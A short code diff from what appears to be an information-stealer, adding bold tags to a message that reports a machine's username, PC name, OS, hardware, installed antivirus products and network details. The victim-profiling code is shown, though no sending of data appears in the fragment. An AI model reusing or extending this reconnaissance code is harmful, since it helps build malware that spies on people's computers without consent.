@@ -250,19 +250,19 @@ Antiviruses: {', '.join(Antiviruses)}
     file.write(logo)
     file.write(systeminfo)
     
-    msgdata=f"""🖥System🖥
+    msgdata=f"""<b>🖥System🖥</b>
 ⏲Time: {time.asctime()}
 👤Username: {os.getlogin()}
 👤PC Name: {uname.node}
 🖥OS: {uname.system} {uname.release}
 
-🖥Hardware🖥
+<b>🖥Hardware🖥</b>
 🔧CPU: {platform.processor()}
 🔧RAM: {get_size(svmem.total)}
 🔧GPU: {', '.join(gpsList)}
 🛡Antiviruses: {', '.join(Antiviruses)}
 
-📡Network📡{ip_info}
+<b>📡Network📡</b>{ip_info}
 """
     return msgdata
 '''
